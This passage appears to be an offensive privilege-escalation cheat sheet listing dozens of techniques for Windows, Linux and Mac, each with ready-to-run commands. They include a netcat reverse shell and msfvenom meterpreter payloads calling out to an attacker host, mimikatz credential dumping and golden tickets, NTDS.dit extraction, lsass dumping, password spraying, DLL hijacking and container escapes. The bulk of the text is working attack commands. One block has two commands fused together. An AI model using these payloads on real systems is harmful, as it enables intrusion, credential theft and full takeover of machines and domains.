Methods:

-   showmount -e \<victim_ip\>

> mkdir /tmp/mount
>
> mount -o rw,vers=2 \<victim_ip\>:/tmp /tmp/mount
>
> cd /tmp/mount
>
> cp /bin/bash .
>
> chmod +s bash

# Abusing Access Control List

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   \$user = \"megacorp\\jorden\"

> \$folder = \"C:\\Users\\administrator\"
>
> \$acl = get-acl \$folder
>
> \$aclpermissions = \$user, \"FullControl\", \"ContainerInherit,
> ObjectInherit\", \"None\", \"Allow\"
>
> \$aclrule = new-object
> System.Security.AccessControl.FileSystemAccessRule \$aclpermissions
>
> \$acl.AddAccessRule(\$aclrule)
>
> set-acl -path \$folder -AclObject \$acl
>
> get-acl \$folder \| folder

# Escalate With SeBackupPrivilege

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

import-module .\\SeBackupPrivilegeUtils.dll

import-module .\\SeBackupPrivilegeCmdLets.dll

Copy-FileSebackupPrivilege z:\\Windows\\NTDS\\ntds.dit
C:\\temp\\ndts.dit

# Escalate With SeImpersonatePrivilege

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

https://github.com/dievus/printspoofer

printspoofer.exe -i -c \"powershell -c whoami\"

# Escalate With SeLoadDriverPrivilege

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

FIRST:

Download
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys

Download
https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp

Download https://github.com/tandasat/ExploitCapcom

change ExploitCapcom.cpp line 292

TCHAR CommandLine\[\] = TEXT(\"C:\\\\Windows\\\\system32\\\\cmd.exe\");

to

TCHAR CommandLine\[\] = TEXT(\"C:\\\\test\\\\shell.exe\");

then compile ExploitCapcom.cpp and eoploaddriver.cpp to .exe

SECOND:

1\. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4
LPORT=4444 -f exe \> shell.exe

2\. .\\eoploaddriver.exe System\\CurrentControlSet\\MyService
C:\\test\\capcom.sys

3\. .\\ExploitCapcom.exe

4\. in msf exec \`run\`

# Escalate With ForceChangePassword

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Import-Module .\\PowerView_dev.ps1

Set-DomainUserPassword -Identity user1 -verbose

Enter-PSSession -ComputerName COMPUTERNAME -Credential ""

# Escalate With GenericWrite

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

\$pass = ConvertTo-SecureString \'Password123\#\' -AsPlainText -Force

\$creds = New-Object
System.Management.Automation.PSCredential(\'DOMAIN\\MASTER USER\'),
\$pass)

Set-DomainObject -Credential \$creds USER1 -Clear serviceprincipalname

Set-DomainObject -Credential \$creds -Identity USER1 -SET
@{serviceprincipalname=\'none/fluu\'}

.\\Rubeus.exe kerberoast /domain:\<DOMAIN\>

# Abusing GPO

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

1..\\SharpGPOAbuse.exe \--AddComputerTask \--Taskname \"Update\"
\--Author DOMAIN\\\<USER\> \--Command \"cmd.exe\" \--Arguments \"/c net
user Administrator Password!@\# /domain\" \--GPOName \"ADDITIONAL DC
CONFIGURATION\"

# Pass-the-Ticket

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Ticket

Methods:

1..\\Rubeus.exe asktgt /user:\<USET\>\$ /rc4:\<NTLM HASH\> /ptt

2.klist

# Golden Ticket

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Ticket

Methods:

1.mimikatz \# lsadump::dcsync /user:\<USER\>

2.mimikatz \# kerberos::golden /user:\<USER\> /domain:\</DOMAIN\>
/sid:\<OBJECT SECURITY ID\> /rce:\<NTLM HASH\> /id:\<USER ID\>

# Abusing Splunk Universal Forwarder

Domain: No

Local Admin: Yes

OS: Linux/Windows

Type: Abuse Channel

Methods:

python PySplunkWhisperer2_remote.py \--lhost 10.10.10.5 \--host
10.10.15.20 \--username admin \--password admin \--payload \'/bin/bash
-c \"rm /tmp/luci11;mkfifo /tmp/luci11;cat /tmp/luci11\|/bin/sh -i
2\>&1\|nc 10.10.10.5 5555 \>/tmp/luci11\"\'

# Abusing Gdbus

Domain: No

Local Admin: Yes

OS: Linux

Type: Abuse Channel

Methods:

gdbus call \--system \--dest com.ubuntu.USBCreator \--object-path
/com/ubuntu/USBCreator \--method com.ubuntu.USBCreator.Image
/home/nadav/authorized_keys /root/.ssh/authorized_keys true

# Abusing Trusted DC

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Abuse Channel

Methods:

1.  Find user in First DC

2.  If port 6666 enabled

3.  proxychains evil-winrm -u user -p \'pass\' -i 10.100.9.253 -P 6666

4.  . \\mimikatz. exe \"privilege:: debug\" \"sekurlsa::
    > logonpasswords\" \"token:: elevate\" \*lsadump:: secrets\*
    > \*exit\"

5.  proxychains evil-winrm -u Administrator -p \'pass dumped in step 4\'
    > -i 10.100.10.100 -P 6666

# NTLM Relay 

Domain: Yes

Local Admin: Y/N

OS: Windows

Methods:

responder -I eth1 -v

ntlmrelayx.py ...

# Exchange Relay 

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: NTLM

Methods:

./exchangeRelayx.py ...

# Dumping with diskshadow

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Dumping

Methods:

1\. priv.txt contain

SET CONTEXT PERSISTENT NOWRITERSp

add volume c: alias 0xprashantp

createp

expose %0xprashant% z:p

2\. exec with diskshadow /s priv.txt

# Dumping with vssadmin

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Dumping

Methods:

vssadmin create shadow /for=C:

copy
\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit
C:\\ShadowCopy

copy
\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM
C:\\ShadowCopy./kerbrute_linux_amd64 passwordspray -d domain.local \--dc
10.10.10.10 domain_users.txt Password123

# Password Spraying

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Spraying

Methods:

./kerbrute_linux_amd64 passwordspray -d domain.local \--dc 10.10.10.10
domain_users.txt Password123

# AS-REP Roasting

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Kerberos

Methods:

.\\Rubeus.exe asreproast

# Kerberoasting

Domain: Yes

Local Admin: Y/N

OS: Windows

Type: Kerberos

Methods:

GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip
10.10.10.100 -request

crackmapexec ldap 10.0.2.11 -u \'username\' -p \'password\' \--kdcHost
10.0.2.11 \--kerberoast output.txt

# Dump lsass with SilentProcessExit

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunting

Methods:

1.  SilentProcessExit.exe pid

# Lsass Shtinkering

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunting

Methods:

1.  HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error
    > Reporting\\LocalDumps-\>2

2.  LSASS_Shtinkering.exe pid

# AndrewSpecial

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunting

Methods:

-   AndrewSpecial.exe

# CCACHE ticket reuse from /tmp

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   ls /tmp/ \| grep krb5cc_X

-   export KRB5CCNAME=/tmp/krb5cc_X

# CCACHE ticket reuse from keyring

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   https://github.com/TarlogicSecurity/tickey

-   /tmp/tickey -i

# CCACHE ticket reuse from SSSD KCM

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   git clone https://github.com/fireeye/SSSDKCMExtractor

-   python3 SSSDKCMExtractor.py \--database secrets.ldb \--key
    > secrets.mkey

# CCACHE ticket reuse from keytab

Domain: Yes

Local Admin: Yes

OS: Linux/Windows/Mac

Type: Enumeration & Hunting

Methods:

-   git clone https://github.com/its-a-feature/KeytabParser

-   python KeytabParser.py /etc/krb5.keytab

-   klist -k /etc/krb5.keytab

> Or

-   klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab

-   python3 keytabextract.py krb5.keytab

-   ./bifrost -action dump -source keytab -path test

# SSH Forwarder

Domain: Yes

Local Admin: Yes

OS: Linux

Type: Enumeration & Hunting

Methods:

-   ForwardAgent yes

-   SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob\@boston

AppleScript

Domain: No

Local Admin: Yes

OS: Windows

Type: Enumeration & Hunt

Methods:

-   (EmPyre) \> listeners

-   (EmPyre: listeners) \> set Name mylistener

-   (EmPyre: listeners) \> execute

-   (EmPyre: listeners) \> usestager applescript mylistener

-   (EmPyre: stager/applescript) \> execute

# DLL Search Order Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie

-   Brownie

# Slui File Handler Hijack LPE

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation

-   Slui.exe

# CDPSvc DLL Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   Cdpsgshims.exe

# Magnify.exe Dll Search Order Hijacking

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   copy payload dll as igdgmm64.dll to SYSTEM path %PATH% which is
    > writeable such as C:\\python27

-   Press WinKey+L

-   Press Enter

-   Press WinKey++(plusKey) on login screen which show password box.

-   then payload dll will execute as SYSTEM access.

# CdpSvc Service 

Domain: No

Local Admin: Yes

OS: Windows

Type: Hijack

Methods:

-   Find Writable SYSTEM PATH with acltest.ps1 (such as C:\\python27)

-   C:\\CdpSvcLPE\> powershell -ep bypass \". .\\acltest.ps1\"

-   Copy cdpsgshims.dll to C:\\python27

-   make C:\\temp folder and copy impersonate.bin to C:\\temp

-   C:\\CdpSvcLPE\> mkdir C:\\temp

-   C:\\CdpSvcLPE\> copy impersonate.bin C:\\temp

-   Reboot (or stop/start CDPSvc as an administrator)

-   cmd wil prompt up with nt authority\\system.

# HiveNightmare

Domain: Yes

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

-   HiveNightmare.exe 200

CVE-2021-30655

Domain: No

Local Admin: Yes

OS: Windows

Type: 0/1 Exploit

Methods:

-   https://github.com/thehappydinoa/rootOS

-   Python rootOS.py

CVE-2019-8526

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   [[https://github.com/amanszpapaya/MacPer]{.ul}](https://github.com/amanszpapaya/MacPer)

-   Python main.py

CVE-2020-9771

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   [[https://github.com/amanszpapaya/MacPer]{.ul}](https://github.com/amanszpapaya/MacPer)

-   Python main.py

CVE-2021-3156

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   [[https://github.com/amanszpapaya/MacPer]{.ul}](https://github.com/amanszpapaya/MacPer)

-   Python main.py

CVE-2018-4280

Domain: No

Local Admin: Yes

OS: Mac

Type: 0/1 Exploit

Methods:

-   https://github.com/bazad/launchd-portrep

-   ./launchd-portrep \'touch /tmp/exploit-success\'=

# Abusing with FileRestorePrivilege

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

# Abusing with RestoreAndBackupPrivileges

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

# Abusing with ShadowCopyBackupPrivilege

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

# Abusing with ShadowCopy

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Abuse Privilege

Methods:

-   poptoke.exe

# Dynamic Phishing

Domain: Y/N

Local Admin: Yes

OS: Mac

Type: Phish

Methods:

-   https://github.com/thehappydinoa/rootOS

-   Python rootOS.py

# Race Conditions

Domain: No

Local Admin: Yes

OS: Windows

Type: Race Condition

Methods:

-   echo \"net localgroup administrators attacker /add\" \>
    > C:\\temp\\not-evil.bat

-   tempracer.exe C:\\ temp\\\*.bat

# Abusing usermode helper API

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

-   d=\`dirname \$(ls -x /s\*/fs/c\*/\*/r\* \|head -n1)\`

-   mkdir -p \$d/w; echo 1 \> \$d/w/notify_on_release

-   t=\`sed -n \'s/.\*\\perdir=\\(\[\^,\]\*\\).\*/\\1/p\' /etc/mtab\`

-   touch /o; echo \$t/c \> \$d/release_agent

-   echo \"\#!/bin/sh\" \> /c

-   echo \"ps \> \$t/o\" \>\> /c

-   chmod +x /c

-   sh -c \"echo 0 \> \$d/w/cgroup.procs\"; sleep 1

-   cat /o

# Escape only with CAP_SYS_ADMIN capability

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

-   mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir
    > /tmp/cgrp/x

-   echo 1 \> /tmp/cgrp/x/notify_on_release

-   host_path=\`sed -n \'s/.\*\\perdir=\\(\[\^,\]\*\\).\*/\\1/p\'
    > /etc/mtab\`

-   echo \"\$host_path/cmd\" \> /tmp/cgrp/release_agent

-   echo \"\#!/bin/sh\" \> /cmd

-   echo \"ps aux \> \$host_path/output\" \>\> /cmd

-   chmod a+x /cmd

-   sh -c \"echo \\\$\\\$ \> /tmp/cgrp/x/cgroup.procs\"

-   cat /output

# Abusing exposed host directories

Domain: No

Local Admin: Yes

OS: Linux

Type: Abusing Capabilities

Methods:

-   mknod /dev/sdb1 block 8 17

-   mkdir /mnt/host_home

-   mount /dev/sdb1 /mnt/host_home

-   echo \'echo \"Hello from container land!\" 2\>&1\' \>\>
    > /mnt/host_home/eric_chiang_m/.bashrc

# 

# Unix Wildcard

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   python wildpwn.py \--file /tmp/very_secret_file combined ./pwn_me/

# Socket Command Injection

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   echo \"cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x
    > /tmp/bash;\" \| socat - UNIX-CLIENT:/tmp/socket_test.s

# Logstash

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   /etc/logstash/logstash.yml

-   input {

> exec {

command =\> \"whoami\"

interval =\> 120

}

}

# UsoDllLoader

Domain: No

Local Admin: Yes

OS: Linux

Type: Injection

Methods:

-   UsoDllLoader.exe

# Trend Chain Methods for Privilege Escalation 

# Habanero Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: Dll Side-loading

Methods:

-   rundll32.exe C:\\Dumpert\\Outflank-Dumpert.dll,Dump

# Padron Chilli

Domain: Y/N

Local Admin: Yes

OS: Windows

Type: Create a Reflective DLL Injector + Reflective DLL for dump lsass
memory without touch hard disk

Methods:

-   \#.\\inject.x64.exe \<Path to reflective dll:
    > .\\LsassDumpReflectiveDLL.dll\>

# Jalapeno Chillies

Domain: Yes

Local Admin: Yes

OS: Windows

Methods: unhook NTDLL.dll + dump the lsass.exe as
WindowsUpdateProvider.pod

Methods:

-   NihilistGuy.exe

# Pasilla Chili

Domain: Yes

Local Admin: Yes

OS: Windows

Methods: SeImpersonatePrivilege + Abusing Service Account Session

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo5.ps1

# Finger Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: Abusing PrintNotify Service + DLL side-loading

Methods:

-   As an administrator, copy winspool.drv and
    > mod-ms-win-core-apiquery-l1-1-0.dll to
    > C:\\Windows\\System32\\spool\\drivers\\x64\\3\\

-   Place all files which included in /bin/ into a same directory.

-   Then, run powershell . .\\spooltrigger.ps1.

-   Enjoy a shell as NT AUTHORITY\\SYSTEM.

# Orange Cayenne

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Silver Ticket + I Know

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo1.ps1

# Red Cayenne

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Silver ticket + User to User Authentication

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   demo2.ps1

# Birds Eye Chilli

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Silver Ticket + Buffer Type Confusion

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo3.ps1

# Scotch Bonnet

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Bring Your Own KDC

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo4.ps1

# Lemon Habanero

Domain: No

Local Admin: Yes

OS: Linux

Type: Capabilities

Methods:

-   gcc -Wl,\--no-as-needed -lcap-ng -o ambient ambient.c

-   sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip
    > ambient

-   ./ambient /bin/bash

# Red Habanero

Domain: No

Local Admin: Yes

OS: Windows

Type: NtSetInformationProcess + DLL side-loading

Methods:

-   BypassRtlSetProcessIsCritical.exe pid

# Ghost Pepper

Domain: No

Local Admin: Yes

OS: Windows

Type: Directory-Deletion + Windows Media Player d/s

Methods:

-   https://github.com/sailay1996/delete2SYSTEM

-   .\\poc.ps1

# Chocolate Scorpion Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: Directory-Deletion + Windows Media Player d/s

Methods:

-   https://github.com/sailay1996/delete2SYSTEM

-   .\\poc.ps1

# Carolina Reaper

Domain: Yes

Local Admin: Yes

OS: Windows

Type: Creates an arbitrary service + PTH

Methods:

-   [[https://github.com/tyranid/blackhat-usa-2022-demos]{.ul}](https://github.com/tyranid/blackhat-usa-2022-demos)

-   Demo6.ps1

# The Intimidator Chilli

Domain: No

Local Admin: Yes

OS: Windows

Type: manipulate memory/process token values/NT system calls and
objects/NT object manager

Methods:

-   https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools

-   Import-Module NtObjectManager

-   Get-ChildItem NtObject:\\

-   NT\*
